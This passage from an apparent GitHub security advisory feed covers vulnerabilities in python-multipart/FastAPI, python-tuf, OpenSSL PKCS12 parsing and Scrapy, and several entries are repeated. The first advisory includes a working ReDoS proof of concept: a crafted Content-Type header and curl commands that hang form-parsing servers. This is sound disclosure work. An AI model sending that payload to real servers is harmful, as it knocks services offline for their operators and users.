<p>This can create a ReDoS (Regular expression Denial of Service): <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></p>
<p>This only applies when the app uses form data, parsed with <code>python-multipart</code>.</p>
<h3 id="details">Details</h3>
<p>A regular HTTP <code>Content-Type</code> header could look like:</p>
<pre><code>Content-Type: text/html; charset=utf-8
</code></pre>
<p><code>python-multipart</code> parses the option with this RegEx: <a href="https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></p>
<p>A custom option could be made and sent to the server to break it with:</p>
<pre><code>Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
</code></pre>
<h3 id="poc">PoC</h3>
<p>Create a simple WSGI application, that just parses the <code>Content-Type</code>, and run it with <code>python main.py</code>:</p>
<pre><code class="language-Python"># main.py
from wsgiref.simple_server import make_server
from wsgiref.validate import validator

from multipart.multipart import parse_options_header


def simple_app(environ, start_response):
    _, _ = parse_options_header(environ["CONTENT_TYPE"])

    start_response("200 OK", [("Content-type", "text/plain")])
    return [b"Ok"]


httpd = make_server("", 8123, validator(simple_app))
print("Serving on port 8123...")
httpd.serve_forever()
</code></pre>
<p>Then send the attacking request with:</p>
<pre><code class="language-console">$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'
</code></pre>
<h3 id="impact">Impact</h3>
<p>It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.</p>
<h3 id="original-report">Original Report</h3>
<p>This was originally reported to FastAPI as an email to <a href="mailto:security@tiangolo.com">security@tiangolo.com</a>, sent via <a href="https://huntr.com/">https://huntr.com/</a>, the original reporter is Marcello, <a href="https://github.com/byt3bl33d3r">https://github.com/byt3bl33d3r</a></p>
<details>
<summary>Original report to FastAPI</summary>

<p>Hey Tiangolo!</p>
<p>My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>
<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>
<pre><code class="language-Python">from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse("Test", status_code=200)

@app.post("/submit/")
async def submit(username: Annotated[str, Form()]):
    return {"username": username}

@app.post("/submit_json/")
async def submit_json(item: Item):
    return {"username": item.username}
</code></pre>
<p>I'm running the above with uvicorn with the following command:</p>
<pre><code class="language-console">uvicorn server:app
</code></pre>
<p>Then run the following cUrl command:</p>
<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
</code></pre>
<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>
<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>
<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>
<p>Cheers</p>
<h4 id="impact-1">Impact</h4>
<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>
<h4 id="occurrences">Occurrences</h4>
<p><a href="https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586">params.py L586</a></p>
</details>
### References

<ul>
<li><a href="https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>
<li><a href="https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>
<li><a href="https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>
<li><a href="https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238">https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238</a></li>
<li><a href="https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389">https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24762">https://nvd.nist.gov/vuln/detail/CVE-2024-24762</a></li>
<li><a href="https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5">https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5</a></li>
<li><a href="https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc">https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml</a></li>
<li><a href="https://github.com/tiangolo/fastapi/releases/tag/0.109.1">https://github.com/tiangolo/fastapi/releases/tag/0.109.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2jv5-9r88-3w3p">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2jv5-9r88-3w3p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-12T17:28:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tuf] tuf's Metadata API:  Targets.get_delegated_role() is missing input validation]]></title>
        <id>https://github.com/advisories/GHSA-77hh-43cm-v8j6</id>
        <link href="https://github.com/advisories/GHSA-77hh-43cm-v8j6"/>
        <updated>2024-02-16T23:35:41.000Z</updated>
        <content type="html"><![CDATA[<p>The security of both a TUF client and repository implementations depend on the concept of trusted Metadata objects verifying the signatures over other Metadata that it delegates to. This verification process uses <code>Targets.get_delegated_role(delegated_role: str)</code> to find the delegation information.</p>
<p><code>tuf.api.metadata.Targets.get_delegated_role()</code> should ensure that the given <code>delegated_rolename</code> is actually a name of a role that is delegated by that Targets, but in the case of "succinct delegation" this does not happen.</p>
<p><code>tuf.ngclient</code> users are <strong>not</strong> impacted but direct users of <code>tuf.api.metadata</code> could be impacted.</p>
<h3 id="impact">Impact</h3>
<p>If an attacker can make a Metadata API user run <code>Targets.get_delegated_role()</code> so that </p>
<ol>
<li>the <code>Targets</code> uses succinct delegation</li>
<li>the <code>delegated_role</code> argument is not actually delegated by the <code>Targets</code></li>
</ol>
<p>the result will be incorrect.</p>
<p>This also means that if an attacker can make a Metadata API user run <code>Targets.verify_delegate()</code> or <code>Targets.get_verification_result()</code> so that</p>
<ol>
<li>the delegating <code>Targets</code> uses a succinct delegation</li>
<li>the <code>delegated_role</code> argument is the name of some unrelated Metadata</li>
<li>that other Metadata is correctly signed by the keys defined in the succinct delegation</li>
</ol>
<p>the result would be a successful verification even though the <code>Targets</code> in question does not actually delegate to <code>delegated_role</code>.</p>
<p>The impact is estimated to be low for following reasons:</p>
<ul>
<li>This cannot impact a TUF client that implements the client workflow as specified since the delegated role name is not an input but is collected from the (trusted) delegating Targets itself</li>
<li>Actual signature verification is not bypassed: The verified metadata <em>must</em> still be correctly signed by the keys specified in the delegating role.</li>
<li>The described situations are somewhat hypothetical: there does not seem to be any reason for a python-tuf user (whether client or a repository) to use <code>tuf.api.metadata</code> in this way.</li>
</ul>
<p>All users of <code>tuf.ngclient</code> are specifically <strong>not</strong> impacted. Users of <code>tuf.api.metadata</code> could be impacted if they use succinct delegations in a way described above.</p>
<h3 id="patches">Patches</h3>
<p>A fix is available in python-tuf 3.1.1 as commit 77cb66bc and in later releases as commit eb4834d9._</p>
<h3 id="workarounds">Workarounds</h3>
<p><code>tuf.api.metadata</code> users should only call <code>Targets.get_delegated_role()</code>, <code>Targets.verify_delegate()</code> or <code>Targets.get_verification_result()</code> with <code>delegated_role</code> argument that is known to be delegated by the <code>Targets</code> in question.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-77hh-43cm-v8j6">https://github.com/theupdateframework/python-tuf/security/advisories/GHSA-77hh-43cm-v8j6</a></li>
<li><a href="https://github.com/theupdateframework/python-tuf/commit/77cb66bc879d108c449ba4c46dfb0e3a9e57a785">https://github.com/theupdateframework/python-tuf/commit/77cb66bc879d108c449ba4c46dfb0e3a9e57a785</a></li>
<li><a href="https://github.com/theupdateframework/python-tuf/commit/eb4834d9205d07ae164bc6c5b97787585c0acfdc">https://github.com/theupdateframework/python-tuf/commit/eb4834d9205d07ae164bc6c5b97787585c0acfdc</a></li>
<li><a href="https://github.com/theupdateframework/python-tuf/releases/tag/v3.1.1">https://github.com/theupdateframework/python-tuf/releases/tag/v3.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-77hh-43cm-v8j6">https://github.com/advisories/GHSA-77hh-43cm-v8j6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-77hh-43cm-v8j6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-02-16T23:35:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cryptography] Null pointer dereference in PKCS12 parsing]]></title>
        <id>https://github.com/advisories/GHSA-9v9h-cgj8-h64p</id>
        <link href="https://github.com/advisories/GHSA-9v9h-cgj8-h64p"/>
        <updated>2024-02-16T20:48:37.000Z</updated>
        <content type="html"><![CDATA[<p>Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL
to crash leading to a potential Denial of Service attack</p>
<p>Impact summary: Applications loading files in the PKCS12 format from untrusted
sources might terminate abruptly.</p>
<p>A file in PKCS12 format can contain certificates and keys and may come from an
untrusted source. The PKCS12 specification allows certain fields to be NULL, but
OpenSSL does not correctly check for this case. This can lead to a NULL pointer
dereference that results in OpenSSL crashing. If an application processes PKCS12
files from an untrusted source using the OpenSSL APIs then that application will
be vulnerable to this issue.</p>
<p>OpenSSL APIs that are vulnerable to this are: PKCS12_parse(),
PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()
and PKCS12_newpass().</p>
<p>We have also fixed a similar issue in SMIME_write_PKCS7(). However since this
function is related to writing data we do not consider it security significant.</p>
<p>The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0727">https://nvd.nist.gov/vuln/detail/CVE-2024-0727</a></li>
<li><a href="https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2">https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2</a></li>
<li><a href="https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a">https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a</a></li>
<li><a href="https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c">https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c</a></li>
<li><a href="https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8">https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8</a></li>
<li><a href="https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539">https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539</a></li>
<li><a href="https://www.openssl.org/news/secadv/20240125.txt">https://www.openssl.org/news/secadv/20240125.txt</a></li>
<li><a href="https://github.com/github/advisory-database/pull/3472">https://github.com/github/advisory-database/pull/3472</a></li>
<li><a href="https://github.com/openssl/openssl/pull/23362">https://github.com/openssl/openssl/pull/23362</a></li>
<li><a href="https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2">https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d">https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20240208-0006">https://security.netapp.com/advisory/ntap-20240208-0006</a></li>
<li><a href="https://github.com/advisories/GHSA-9v9h-cgj8-h64p">https://github.com/advisories/GHSA-9v9h-cgj8-h64p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v9h-cgj8-h64p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-26T09:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy decompression bomb vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</id>
        <link href="https://github.com/advisories/GHSA-7j7m-v7m3-jqm7"/>
        <updated>2024-02-16T16:07:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Scrapy limits allowed response sizes by default through the <a href="https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize"><code>DOWNLOAD_MAXSIZE</code></a> and <a href="https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize"><code>DOWNLOAD_WARNSIZE</code></a> settings.</p>
<p>However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to <a href="https://cwe.mitre.org/data/definitions/409.html">decompression bombs</a>.</p>
<p>A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.11.1.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no easy workaround.</p>
<p>Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.</p>
<p>However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This security issue was reported by @dmandefy  <a href="https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/">through huntr.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7">https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5">https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f">https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f</a></li>
<li><a href="https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>
<li><a href="https://github.com/advisories/GHSA-7j7m-v7m3-jqm7">https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-16T16:07:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy decompression bomb vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</id>
        <link href="https://github.com/advisories/GHSA-7j7m-v7m3-jqm7"/>
        <updated>2024-02-16T16:07:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Scrapy limits allowed response sizes by default through the <a href="https://docs.scrapy.org/en/latest/topics/settings.html#download-maxsize"><code>DOWNLOAD_MAXSIZE</code></a> and <a href="https://docs.scrapy.org/en/latest/topics/settings.html#download-warnsize"><code>DOWNLOAD_WARNSIZE</code></a> settings.</p>
<p>However, those limits were only being enforced during the download of the raw, usually-compressed response bodies, and not during decompression, making Scrapy vulnerable to <a href="https://cwe.mitre.org/data/definitions/409.html">decompression bombs</a>.</p>
<p>A malicious website being scraped could send a small response that, on decompression, could exhaust the memory available to the Scrapy process, potentially affecting any other process sharing that memory, and affecting disk usage in case of uncompressed response caching.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.11.1.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no easy workaround.</p>
<p>Disabling HTTP decompression altogether is impractical, as HTTP compression is a rather common practice.</p>
<p>However, it is technically possible to manually backport the 2.11.1 or 1.8.4 fix, replacing the corresponding components of an unpatched version of Scrapy with patched versions copied into your own code.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This security issue was reported by @dmandefy  <a href="https://huntr.com/bounties/c4a0fac9-0c5a-4718-9ee4-2d06d58adabb/">through huntr.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7">https://github.com/scrapy/scrapy/security/advisories/GHSA-7j7m-v7m3-jqm7</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5">https://github.com/scrapy/scrapy/commit/71b8741e3607cfda2833c7624d4ada87071aa8e5</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f">https://github.com/scrapy/scrapy/commit/809bfac4890f75fc73607318a04d2ccba71b3d9f</a></li>
<li><a href="https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>
<li><a href="https://github.com/advisories/GHSA-7j7m-v7m3-jqm7">https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7j7m-v7m3-jqm7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-16T16:07:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy authorization header leakage on cross-domain redirect]]></title>
        <id>https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</id>
        <link href="https://github.com/advisories/GHSA-cw9j-q3vf-hrrv"/>
        <updated>2024-02-15T15:32:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When you send a request with the <code>Authorization</code> header to one domain, and the response asks to redirect to a different domain, Scrapy’s built-in redirect middleware creates a follow-up redirect request that keeps the original <code>Authorization</code> header, leaking its content to that second domain.</p>
<p>The <a href="https://fetch.spec.whatwg.org/#ref-for-cors-non-wildcard-request-header-name">right behavior</a> would be to drop the <code>Authorization</code> header instead, in this scenario.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.11.1.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, make sure that you are not using the <code>Authentication</code> header, either directly or through some third-party plugin.</p>
<p>If you need to use that header in some requests, add <code>"dont_redirect": True</code> to the <code>request.meta</code> dictionary of those requests to disable following redirects for them.</p>
<p>If you need to keep (same domain) redirect support on those requests, make sure you trust the target website not to redirect your requests to a different domain.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This security issue was reported by @ranjit-git  <a href="https://huntr.com/bounties/49974321-2718-43e3-a152-62b16eed72a9/">through huntr.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv">https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae">https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae</a></li>
<li><a href="https://github.com/advisories/GHSA-cw9j-q3vf-hrrv">https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-15T15:32:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy authorization header leakage on cross-domain redirect]]></title>
        <id>https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</id>
        <link href="https://github.com/advisories/GHSA-cw9j-q3vf-hrrv"/>
        <updated>2024-02-15T15:32:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When you send a request with the <code>Authorization</code> header to one domain, and the response asks to redirect to a different domain, Scrapy’s built-in redirect middleware creates a follow-up redirect request that keeps the original <code>Authorization</code> header, leaking its content to that second domain.</p>
<p>The <a href="https://fetch.spec.whatwg.org/#ref-for-cors-non-wildcard-request-header-name">right behavior</a> would be to drop the <code>Authorization</code> header instead, in this scenario.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.11.1.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, make sure that you are not using the <code>Authentication</code> header, either directly or through some third-party plugin.</p>
<p>If you need to use that header in some requests, add <code>"dont_redirect": True</code> to the <code>request.meta</code> dictionary of those requests to disable following redirects for them.</p>
<p>If you need to keep (same domain) redirect support on those requests, make sure you trust the target website not to redirect your requests to a different domain.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This security issue was reported by @ranjit-git  <a href="https://huntr.com/bounties/49974321-2718-43e3-a152-62b16eed72a9/">through huntr.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv">https://github.com/scrapy/scrapy/security/advisories/GHSA-cw9j-q3vf-hrrv</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae">https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae</a></li>
<li><a href="https://github.com/advisories/GHSA-cw9j-q3vf-hrrv">https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cw9j-q3vf-hrrv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-15T15:32:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] ReDos vulnerability of XMLFeedSpider]]></title>
        <id>https://github.com/advisories/GHSA-cc65-xxvf-f7r9</id>
        <link href="https://github.com/advisories/GHSA-cc65-xxvf-f7r9"/>
        <updated>2024-02-15T15:30:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The following parts of the Scrapy API were found to be vulnerable to a <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">ReDoS attack</a>:</p>
<ul>
<li><p>The <a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.XMLFeedSpider"><code>XMLFeedSpider</code></a> class or any subclass that uses the default node iterator: <code>iternodes</code>, as well as direct uses of the <code>scrapy.utils.iterators.xmliter</code> function.</p>
</li>
<li><p><strong>Scrapy 2.6.0 to 2.11.0</strong>: The <a href="https://docs.scrapy.org/en/latest/topics/debug.html#scrapy.utils.response.open_in_browser"><code>open_in_browser</code></a> function for a response without a <a href="https://www.w3schools.com/tags/tag_base.asp">base tag</a>.</p>
</li>
</ul>
<p>Handling a malicious response could cause extreme CPU and memory usage during the parsing of its content, due to the use of vulnerable regular expressions for that parsing.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.11.1.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>For <code>XMLFeedSpider</code>, switch the node iterator to <code>xml</code> or <code>html</code>.</p>
<p>For <code>open_in_browser</code>, before using the function, either manually review the response content to discard a ReDos attack or manually define the base tag to avoid its automatic definition by <code>open_in_browser</code> later.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This security issue was reported by @nicecatch2000  <a href="https://huntr.com/bounties/271f94f2-1e05-4616-ac43-41752389e26b/">through huntr.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9">https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9</a></li>
<li><a href="https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14">https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14</a></li>
<li><a href="https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5">https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b">https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b</a></li>
<li><a href="https://github.com/advisories/GHSA-cc65-xxvf-f7r9">https://github.com/advisories/GHSA-cc65-xxvf-f7r9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc65-xxvf-f7r9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-15T15:22:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] ReDos vulnerability of XMLFeedSpider]]></title>
        <id>https://github.com/advisories/GHSA-cc65-xxvf-f7r9</id>
        <link href="https://github.com/advisories/GHSA-cc65-xxvf-f7r9"/>
        <updated>2024-02-15T15:30:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The following parts of the Scrapy API were found to be vulnerable to a <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">ReDoS attack</a>:</p>
<ul>
